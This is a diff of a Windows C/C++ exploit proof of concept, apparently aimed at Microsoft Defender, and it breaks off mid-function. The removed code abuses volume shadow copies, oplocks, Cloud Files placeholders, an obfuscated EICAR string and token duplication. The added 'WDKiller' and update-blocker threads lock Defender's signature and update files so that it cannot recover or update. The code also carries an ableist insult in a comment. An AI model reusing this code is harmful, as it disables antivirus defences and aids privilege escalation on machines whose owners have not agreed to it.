@@ -1,769 +1,452 @@
-
-
-// It gets funnier as time passes...
-
 #define _CRT_SECURE_NO_WARNINGS
-#include <iostream>
-#include <string>
 #include <Windows.h>
-#include <conio.h>
+#include <stdio.h>
 #include <winternl.h>
 #include <ntstatus.h>
-#include <cfapi.h>
-
-#pragma comment(lib,"synchronization.lib")
-#pragma comment(lib,"sas.lib")
+#include <conio.h>
+#include <objbase.h>
 #pragma comment(lib,"ntdll.lib")
-#pragma comment(lib,"CldApi.lib")
 
+HANDLE* gHandleTracker = NULL;
+CRITICAL_SECTION* gHandleTrackerLock;
 
-typedef struct _FILE_DISPOSITION_INFORMATION_EX {
-    ULONG Flags;
-} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
+wchar_t gbackupfile1[MAX_PATH] = { 0 };
+wchar_t gbackupfile2[MAX_PATH] = { 0 };
 
-typedef struct _FILE_RENAME_INFORMATION {
-#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
-    union {
-        BOOLEAN ReplaceIfExists;  // FileRenameInformation
-        ULONG Flags;              // FileRenameInformationEx
-    } DUMMYUNIONNAME;
-#else
-    BOOLEAN ReplaceIfExists;
-#endif
-    HANDLE RootDirectory;
-    ULONG FileNameLength;
-    WCHAR FileName[1];
-} FILE_RENAME_INFORMATION, * PFILE_RENAME_INFORMATION;
+struct UpdThreadObj {
 
-typedef struct _OBJECT_DIRECTORY_INFORMATION {
-    UNICODE_STRING Name;
-    UNICODE_STRING TypeName;
-} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
+	wchar_t* wdupdatedir;
+	wchar_t* target;
 
-
-typedef struct _REPARSE_DATA_BUFFER {
-    ULONG  ReparseTag;
-    USHORT ReparseDataLength;
-    USHORT Reserved;
-    union {
-        struct {
-            USHORT SubstituteNameOffset;
-            USHORT SubstituteNameLength;
-            USHORT PrintNameOffset;
-            USHORT PrintNameLength;
-            ULONG Flags;
-            WCHAR PathBuffer[1];
-        } SymbolicLinkReparseBuffer;
-        struct {
-            USHORT SubstituteNameOffset;
-            USHORT SubstituteNameLength;
-            USHORT PrintNameOffset;
-            USHORT PrintNameLength;
-            WCHAR PathBuffer[1];
-        } MountPointReparseBuffer;
-        struct {
-            UCHAR  DataBuffer[1];
-        } GenericReparseBuffer;
-    } DUMMYUNIONNAME;
-} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
-
-#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)
-
-
-
-HMODULE h = LoadLibrary(L"ntdll.dll");
-HMODULE hm = GetModuleHandle(L"ntdll.dll");
-NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
-    PHANDLE            DirectoryHandle,
-    ACCESS_MASK        DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes
-    ) = (NTSTATUS(WINAPI*)(
-        PHANDLE            DirectoryHandle,
-        ACCESS_MASK        DesiredAccess,
-        POBJECT_ATTRIBUTES ObjectAttributes
-        ))GetProcAddress(hm, "NtOpenDirectoryObject");;
-NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
-    HANDLE  DirectoryHandle,
-    PVOID   Buffer,
-    ULONG   Length,
-    BOOLEAN ReturnSingleEntry,
-    BOOLEAN RestartScan,
-    PULONG  Context,
-    PULONG  ReturnLength
-    ) = (NTSTATUS(WINAPI*)(
-        HANDLE  DirectoryHandle,
-        PVOID   Buffer,
-        ULONG   Length,
-        BOOLEAN ReturnSingleEntry,
-        BOOLEAN RestartScan,
-        PULONG  Context,
-        PULONG  ReturnLength
-        ))GetProcAddress(hm, "NtQueryDirectoryObject");
-NTSTATUS(WINAPI* _NtSetInformationFile)(
-    HANDLE                 FileHandle,
-    PIO_STATUS_BLOCK       IoStatusBlock,
-    PVOID                  FileInformation,
-    ULONG                  Length,
-    FILE_INFORMATION_CLASS FileInformationClass
-    ) = (NTSTATUS(WINAPI*)(
-        HANDLE                 FileHandle,
-        PIO_STATUS_BLOCK       IoStatusBlock,
-        PVOID                  FileInformation,
-        ULONG                  Length,
-        FILE_INFORMATION_CLASS FileInformationClass
-        ))GetProcAddress(hm, "NtSetInformationFile");
-
-
-
-struct LLShadowVolumeNames
-{
-    wchar_t* name;
-    LLShadowVolumeNames* next;
 };
-void DestroyVSSNamesList(LLShadowVolumeNames* First)
+
+void AddHandle(HANDLE hlock)
 {
-    while (First)
-    {
-        free(First->name);
-        LLShadowVolumeNames* next = First->next;
-        free(First);
-        First = next;
-    }
+	// shit code but works i guess
+	static unsigned int handlecount = 0;
+	EnterCriticalSection(gHandleTrackerLock);
+	HANDLE* ntracker = (HANDLE*)malloc((++handlecount + 1) * sizeof(HANDLE));
+	if (gHandleTracker)
+	{
+		memmove(ntracker, gHandleTracker, handlecount * sizeof(HANDLE));
+	} 
+	ntracker[handlecount - 1] = hlock;
+	ntracker[handlecount] = NULL;
+	if (gHandleTracker)
+		free(gHandleTracker);
+	gHandleTracker = ntracker;
+	LeaveCriticalSection(gHandleTrackerLock);
 }
 
-LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber)
-{
+void TryLockBackup() {
 
+	static HANDLE hlock1 = NULL;
+	static HANDLE hlock2 = NULL;
+	if (hlock1 && hlock2)
+		return;
+	UNICODE_STRING unistr = { 0 };
+	OBJECT_ATTRIBUTES objattr = { 0 };
+	RtlInitUnicodeString(&unistr, gbackupfile1);
+	InitializeObjectAttributes(&objattr, &unistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	IO_STATUS_BLOCK iostat = { 0 };
 
-    if (!criticalerr || !vscnumber)
-        return NULL;
+	NTSTATUS ntstat = STATUS_SUCCESS;
+	if (!hlock1)
+		ntstat = NtCreateFile(&hlock1, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
 
-    *vscnumber = 0;
-    ULONG scanctx = 0;
-    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
-    ULONG retsz = 0;
-    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
-    if (!objdirinfo)
-    {
-        printf("Failed to allocate required buffer to query object manager directory.\n");
-        *criticalerr = true;
-        return NULL;
-    }
-    ZeroMemory(objdirinfo, reqsz);
-    NTSTATUS stat = STATUS_SUCCESS;
-    do
-    {
-        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
-        if (stat == STATUS_SUCCESS)
-            break;
-        else if (stat != STATUS_MORE_ENTRIES)
-        {
-            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
-            *criticalerr = true;
-            return NULL;
-        }
+	RtlInitUnicodeString(&unistr, gbackupfile2);
+	if (!hlock2)
+		ntstat = NtCreateFile(&hlock2, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
+	LARGE_INTEGER li2 = { 0 };
+	if (hlock1) {
+		LARGE_INTEGER li = { 0 };
+		GetFileSizeEx(hlock1, &li);
+		OVERLAPPED ov = { 0 };
+		LockFileEx(hlock1, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
+		printf("File \"%ws\" was locked.\n", &gbackupfile2[4]);
+		AddHandle(hlock1);
+	}
+	if (hlock2)
+	{
+		LARGE_INTEGER li = { 0 };
+		GetFileSizeEx(hlock2, &li);
+		OVERLAPPED ov = { 0 };
+		LockFileEx(hlock2, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
+		printf("File \"%ws\" was locked.\n", &gbackupfile2[4]);
+		AddHandle(hlock2);
 
-        free(objdirinfo);
-        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
-        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
-        if (!objdirinfo)
-        {
-            printf("Failed to allocate required buffer to query object manager directory.\n");
-            *criticalerr = true;
-            return NULL;
-        }
-        ZeroMemory(objdirinfo, reqsz);
-    } while (1);
-    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
-    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
-    LLShadowVolumeNames* LLVSScurrent = NULL;
-    LLShadowVolumeNames* LLVSSfirst = NULL;
-    for (ULONG i = 0; i < ULONG_MAX; i++)
-    {
-        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
-        {
-            free(emptybuff);
-            break;
-        }
-        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
-        {
-            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
-            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
-            {
-                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
-                {
-                    (*vscnumber)++;
-                    if (LLVSScurrent)
-                    {
-                        LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
-                        if (!LLVSScurrent->next)
-                        {
-                            printf("Failed to allocate memory.\n");
-                            *criticalerr = true;
-                            DestroyVSSNamesList(LLVSSfirst);
-                            return NULL;
-                        }
-                        ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
-                        LLVSScurrent = LLVSScurrent->next;
-                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
-                        if (!LLVSScurrent->name)
-                        {
-                            printf("Failed to allocate memory !!!\n");
-                            *criticalerr = true;
-                            return NULL;
-                        }
-                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
-                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
-                    }
-                    else
-                    {
-                        LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
-                        if (!LLVSSfirst)
-                        {
-                            printf("Failed to allocate memory.\n");
-                            *criticalerr = true;
-                            return NULL;
-                        }
-                        ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
-                        LLVSScurrent = LLVSSfirst;
-                        LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
-                        if (!LLVSScurrent->name)
-                        {
-                            printf("Failed to allocate memory !!!\n");
-                            *criticalerr = true;
-                            return NULL;
-                        }
-                        ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
-                        memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
-
-                    }
-
-                }
-            }
-        }
-
-
-
-
-    }
-    free(objdirinfo);
-    return LLVSSfirst;
-
-
+	}
+	return;
 }
 
 
-HANDLE gevent = CreateEvent(NULL, FALSE, NULL, NULL);
-
-DWORD WINAPI ShadowCopyFinderThread(wchar_t* foo)
+DWORD WINAPI UpdateBlockerThread(UpdThreadObj* argv)
 {
+	wchar_t fpath[MAX_PATH] = { 0 };
+	wchar_t _fpath[MAX_PATH] = { 0 };
+	wcscpy(fpath, argv->wdupdatedir);
+	wcscat(fpath, L"\\");
+	wcscat(fpath, argv->target);
+	free(argv->target);
+	delete argv;
+	DWORD index = 0;
 
-    wchar_t devicepath[] = L"\\Device";
-    UNICODE_STRING udevpath = { 0 };
-    RtlInitUnicodeString(&udevpath, devicepath);
-    OBJECT_ATTRIBUTES objattr = { 0 };
-    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    NTSTATUS stat = STATUS_SUCCESS;
-    HANDLE hobjdir = NULL;
-    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
-    if (stat)
-    {
-        printf("Failed to open object manager directory, error : 0x%0.8X", stat);
-        return 1;
-    }
-    bool criterr = false;
-    int vscnum = 0;
-    LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum);
+	HANDLE hlock = NULL;
+	UNICODE_STRING target = { 0 };
+	OBJECT_ATTRIBUTES objattr = { 0 };
+	CLSID tmp = { 0 };
+	NTSTATUS stat = STATUS_SUCCESS;
+	IO_STATUS_BLOCK iostat = { 0 };
+	wchar_t mx[40] = { 0 };
+	/*
+	for (int i = wcslen(fpath); i > 0; i--) {
 
-    if (criterr)
-    {
-        printf("Unexpected error while listing current volume shadow copy volumes\n");
-        ExitProcess(1);
-    }
-    
+		if (fpath[i] == L'\\')
+		{
+			if (wcslen(fpath) > 99)
+			{
+				memmove(mx, &fpath[i - 38], 38 * sizeof(wchar_t));
+				break;
+			}
+			else if (wcslen(fpath) > 67)
+			{
+				memmove(mx, &fpath[i - 6], 6 * sizeof(wchar_t));
+				break;
+			}
+			
+			break;
+		}
+	}
+	wchar_t __cmp[7] = { 0 };
+	memmove(__cmp, mx, 6 * sizeof(wchar_t));*/
+	if (1/*(!CLSIDFromString(mx, &tmp)) || _wcsicmp(__cmp, L"Backup") == 0*/)
+	{
+		printf("Found path : \"%ws\"\n", fpath);
+		wcscpy(_fpath, L"\\??\\");
+		wcscat(_fpath, fpath);
+		RtlInitUnicodeString(&target, _fpath);
+		InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);
+		IO_STATUS_BLOCK iostat = { 0 };
 
-    bool restartscan = false;
-    ULONG scanctx = 0;
-    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
-    ULONG retsz = 0;
-    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
-    if (!objdirinfo)
-    {
-        printf("Failed to allocate required buffer to query object manager directory.\n");
-        ExitProcess(1);
-    }
-    ZeroMemory(objdirinfo, reqsz);
-    stat = STATUS_SUCCESS;
-    bool srchfound = false;
-scanagain:
-    do
-    {
-        scanctx = 0;
-        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
-        if (stat == STATUS_SUCCESS)
-            break;
-        else if (stat != STATUS_MORE_ENTRIES)
-        {
-            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
-            ExitProcess(1);
-        }
+		do {
+			stat = NtCreateFile(&hlock, GENERIC_READ | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, NULL);
+			if (stat == STATUS_NOT_FOUND || stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
+				return stat;
+		} while (stat);
+		LARGE_INTEGER li = { 0 };
+		GetFileSizeEx(hlock, &li);
+		LARGE_INTEGER offset = { 0,0 };
 
-        free(objdirinfo);
-        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
-        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
-        if (!objdirinfo)
-        {
-            printf("Failed to allocate required buffer to query object manager directory.\n");
-            ExitProcess(1);
-        }
-        ZeroMemory(objdirinfo, reqsz);
-    } while (1);
-    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
-    if (!emptybuff)
-    {
-        printf("Failed to allocate memory !!!");
-        ExitProcess(1);
-    }
-    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
-    wchar_t newvsspath[MAX_PATH] = { 0 };
-    wcscpy(newvsspath, L"\\Device\\");
-
-    for (ULONG i = 0; i < ULONG_MAX; i++)
-    {
-        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
-        {
-            free(emptybuff);
-            emptybuff = NULL;
-            break;
-        }
-        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
-        {
-            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
-            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
-            {
-                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
-                {
-                    // check against the list if there this is a unique VS Copy
-                    LLShadowVolumeNames* current = vsinitial;
-                    bool found = false;
-                    while (current)
-                    {
-                        if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
-                        {
-                            found = true;
-                            break;
-                        }
-                        current = current->next;
-                    }
-                    if (found)
-                        continue;
-                    else
-                    {
-                        srchfound = true;
-                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
-                        break;
-                    }
-                }
-            }
-        }
-    }
-
-    if (!srchfound) {
-        restartscan = true;
-        goto scanagain;
-    }
-    if (objdirinfo)
-        free(objdirinfo);
-    NtClose(hobjdir);
-
-    wchar_t malpath[MAX_PATH] = { 0 };
-    wcscpy(malpath, newvsspath);
-    wcscat(malpath, &foo[2]);
-    UNICODE_STRING _malpath = { 0 };
-    RtlInitUnicodeString(&_malpath, malpath);
-    OBJECT_ATTRIBUTES objattr2 = { 0 };
-    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    IO_STATUS_BLOCK iostat = { 0 };
-    HANDLE hlk = NULL;
-retry:
-    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, NULL, NULL, NULL);
-    if (stat == STATUS_NO_SUCH_DEVICE)
-        goto retry;
-    if (stat)
-    {
-        printf("Failed to open file, error : 0x%0.8X\n", stat);
-        return 1;
-
-    }
-    printf("The sun is shinning...\n");
-    
-
-    OVERLAPPED ovd = { 0 };
-    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
-    if (GetLastError() != ERROR_IO_PENDING)
-    {
-        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
-        return 0;
-    }
-
-
-    DWORD nbytes = 0;
-    SetEvent(gevent);
-    ResetEvent(gevent);
-    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);
-
-    WaitForSingleObject(gevent, INFINITE);
-
-
-    CloseHandle(hlk);
-    WakeByAddressAll(&gevent);
-    CloseHandle(gevent);
-    gevent = NULL;
-
-    return ERROR_SUCCESS;
+		if (!LockFile(hlock, offset.LowPart, offset.HighPart, li.LowPart, li.HighPart))
+		{
+			printf("LockFile failed, error : %d\n", GetLastError());
+		}
+		printf("File \"%ws\" was locked.\n", fpath);
+		
+		AddHandle(hlock);
+	}
+	
+	return ERROR_SUCCESS;
 }
 
 
-// Multi-layer obfuscated EICAR - XOR + reverse at runtime (highly effective against current Defender)
-std::string getEICAR() {
-    // Base encoded (XOR 0xAA then reversed in source)
-    std::string encoded = "\xE7\xF5\xDA\xE9\xDA\xD7\xA1\xE8\xDA\xD2\xDA\xDA\xA6\xDA\xD7\xA1\xDA\xD7\xA1\xC3\xC4\xC4\xDA\xD7\xA1\xA1\xDA\xA1\xDA\xD7\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1\xA1"; 
-    std::string decoded;
-    for (char c : encoded) {
-        decoded += (c ^ 0xAA);  // Change key if you want (e.g. 0x55)
-    }
-    // Reverse it at runtime (original EICAR is often stored reversed in PoC)
-    std::reverse(decoded.begin(), decoded.end());
-    return decoded;
+VOID WDKillerCallback(IN PVOID pParameter)
+{
+
+	printf("Windows defender stopped...\n");
+	PSERVICE_NOTIFY psny = (PSERVICE_NOTIFY)pParameter;
+	SC_HANDLE hsvc = (SC_HANDLE)psny->pContext;
+	DWORD requiredbytes = 0;
+	QueryServiceConfig(hsvc, NULL, NULL, &requiredbytes);
+	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+	{
+		printf("Failed to query windows defender service configuration, error : %d\n", GetLastError());
+		return;
+	}
+	LPQUERY_SERVICE_CONFIG svccfg = (LPQUERY_SERVICE_CONFIG)malloc(requiredbytes);
+	if (!QueryServiceConfig(hsvc, svccfg, requiredbytes, &requiredbytes))
+	{
+		printf("Failed to query windows defender service configuration, error : %d\n", GetLastError());
+		return;
+	}
+	svccfg->lpBinaryPathName[wcslen(svccfg->lpBinaryPathName) - 1] = NULL;
+	wchar_t* binpath = &svccfg->lpBinaryPathName[1];
+	/*
+	wchar_t dllpath[MAX_PATH] = { 0 };
+	memmove(dllpath, binpath, wcslen(binpath) * sizeof(wchar_t) - (11 * sizeof(wchar_t)));
+	wcscat(dllpath, L"MpSvc.dll");
+	printf("%ws\n", dllpath);
+	*/
+
+
+	HKEY wdkey = NULL;
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates", NULL, KEY_READ, &wdkey) || !wdkey)
+	{
+		printf("Failed to open windows defender key.\n");
+		return;
+	}
+	wchar_t sigpath[MAX_PATH] = { 0 };
+	DWORD retsz = sizeof(sigpath);
+	//TODO : Check if this returns a properly null terminated string
+	DWORD retcode = RegQueryValueEx(wdkey, L"SignatureLocation", NULL, NULL, (LPBYTE)sigpath, &retsz);
+	RegCloseKey(wdkey);
+	wdkey = NULL;
+	if (retcode)
+	{
+		printf("Failed to find windows defender signature path.\n");
+		return;
+	}
+
+	wcscat(sigpath, L"\\mpavbase.vdm");
+	wchar_t _sigpath[MAX_PATH] = { 0 };
+	wcscpy(_sigpath, L"\\??\\");
+	wcscat(_sigpath, sigpath);
+	UNICODE_STRING unistr = { 0 };
+	RtlInitUnicodeString(&unistr, _sigpath);
+	OBJECT_ATTRIBUTES objattr = { 0 };
+	InitializeObjectAttributes(&objattr, &unistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	IO_STATUS_BLOCK iostat = { 0 };
+	// if you are reading this, you are autistic.
+	HANDLE hlock = NULL;
+	NTSTATUS ntstat = STATUS_SUCCESS;
+	ntstat = NtCreateFile(&hlock, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);
+	if (ntstat)
+	{
+		printf("Failed to open engine file \"%ws\", error : 0x%0.8X\n", unistr.Buffer, ntstat);
+		return;
+	}
+	LARGE_INTEGER li = { 0 };
+	LARGE_INTEGER li2 = { 0 };
+	GetFileSizeEx(hlock, &li);
+	OVERLAPPED ov = { 0 };
+	LockFileEx(hlock, LOCKFILE_EXCLUSIVE_LOCK, NULL, li.LowPart, li.HighPart, &ov);
+
+	printf("File locked.\n");
+	free(svccfg);
+	AddHandle(hlock);
+	return;
 }
 
 
-void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
+DWORD WINAPI WDKillerThread(void*)
 {
+	SC_HANDLE hsvc = NULL;
+	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+	if (!scmgr)
+	{
+		printf("Failed to open service manager, error : %d\n", GetLastError());
+		return 1;
+	}
+	hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
+	CloseServiceHandle(scmgr);
+	if (!hsvc)
+	{
+		printf("Failed to open WinDefend service, error : %d\n", GetLastError());
+		return 1;
+	}
 
-    CF_SYNC_REGISTRATION cfreg = { 0 };
-    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
-    cfreg.ProviderName = L"SERIOUSLYMSFT"; // let's see how long you can play this game, I'm willing to go as far as you want.
-    cfreg.ProviderVersion = L"1.0";
-    CF_SYNC_POLICIES syncpolicy = { 0 };
-    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
-    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
-    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
-    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
-    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
-    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
-    HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
-    if (hs)
-    {
-        printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
-        return;
-    }
-
-    CF_CALLBACK_REGISTRATION callbackreg[1];
-    callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
-    void* callbackctx = NULL; 
-    CF_CONNECTION_KEY cfkey = { 0 };
-    hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
-    if (hs)
-    {
-        printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
-        return;
-    }
-
-    SYSTEMTIME systime = { 0 };
-    FILETIME filetime = { 0 };
-    GetSystemTime(&systime);
-    SystemTimeToFileTime(&systime, &filetime);
-
-    FILE_BASIC_INFO filebasicinfo = { 0 };
-    filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
-    CF_FS_METADATA fsmetadata = { filebasicinfo, {filesz} };
-    CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
-    placeholder[0].RelativeFileName = filename;
-    placeholder[0].FsMetadata = fsmetadata;
-
-
-    GUID uid = { 0 };
-    wchar_t wuid[100] = {0};
-    CoCreateGuid(&uid);
-    StringFromGUID2(uid, wuid,100);
-    placeholder[0].FileIdentity = wuid;
-    placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
-    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
-    DWORD processedentries = 0;
-    //WaitForSingleObject(hevent, INFINITE);
-    hs = CfCreatePlaceholders(syncroot, placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
-    if (hs)
-    {
-        printf("Failed to create placeholder file, error : 0x%0.8X\n", hs);
-        return;
-    }
-    return;
-
+	SERVICE_STATUS svcstat = { 0 };
+	if (!QueryServiceStatus(hsvc, &svcstat) || svcstat.dwCurrentState != SERVICE_RUNNING)
+	{
+		printf("Windows Defender isn't running, exiting...");
+		CloseHandle(hsvc);
+		ExitProcess(ERROR_SUCCESS);
+	}
+	while (1) {
+		SERVICE_NOTIFY_2W svcnotify = { 0 };
+		svcnotify.dwVersion = SERVICE_NOTIFY_STATUS_CHANGE;
+		svcnotify.pfnNotifyCallback = WDKillerCallback;
+		svcnotify.pContext = hsvc;
+		if (NotifyServiceStatusChangeW(hsvc,
+			SERVICE_NOTIFY_STOPPED, &svcnotify))
+		{
+			printf("Failed to set a notification for windows defender status.\n");
+			CloseHandle(hsvc);
+			return 1;
+		}
+		printf("Registered callback for Windows Defender status change.\n");
+		SleepEx(INFINITE, TRUE);
+	}
+	CloseHandle(hsvc);
+	return 0;
 
 }
 
+DWORD WINAPI MRTWorkerThread(void*) {
 
-void LaunchConsoleInSessionId()
-{
+	wchar_t wdpath[MAX_PATH] = { 0 };
+	wchar_t _wdupdatedir[] = { L"\\??\\C:\\Windows\\System32\\MRT"};
+	UNICODE_STRING target = { 0 };
+	RtlInitUnicodeString(&target, _wdupdatedir);
+	OBJECT_ATTRIBUTES objattr = { 0 };
+	IO_STATUS_BLOCK iostat = { 0 };
+	HANDLE hmonitordir = NULL;
+	DWORD retbytes = 0;
 
-    HANDLE hpipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hpipe == INVALID_HANDLE_VALUE)
-        return;
-    DWORD sessionid = 0;
-    if (!GetNamedPipeServerSessionId(hpipe, &sessionid))
-        return;
-    CloseHandle(hpipe);
-    HANDLE htoken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
-        return;
-    HANDLE hnewtoken = NULL;
-    bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
-    CloseHandle(htoken);
-    if (!res)
-        return;
+	InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	NTSTATUS stat = STATUS_SUCCESS; 
+	do {
+		Sleep(10);
+		stat = NtCreateFile(&hmonitordir, FILE_READ_DATA | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
